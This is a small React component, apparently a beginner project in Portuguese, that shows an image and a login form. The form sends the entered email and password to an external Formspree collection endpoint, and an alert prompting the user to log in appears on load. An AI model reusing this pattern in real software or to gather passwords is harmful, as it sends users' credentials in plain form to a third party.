import { useState } from 'react'
import Imagem from "../public/comput.png"
import "./assets/index.scss"


function App() {
  const [count, setCount] = useState('')
// Principal Menu
for ( let x = 1; x<2; x = x +1){
  alert("Faça o seu Login")
}
  

  return (
    <>
    
      <div className='Principal'>
        <img src={Imagem} alt='ERROR' width={750}/>
        <div className='Title'>
        <h1>Login</h1>
        <form action='https://formspree.io/f/xdoqoooy' method='POST' target='_blank'>

            <input type='email' placeholder='@exemplo' name='email' id='email' required='required'/><p/>
            <input type='password'placeholder='senha' name='senha' id='senha' requerid='required'/><p/>
            <button type='submit'>Enviar</button>
        </form>
        </div>
      </div>
    </>
  )
}

export default App;

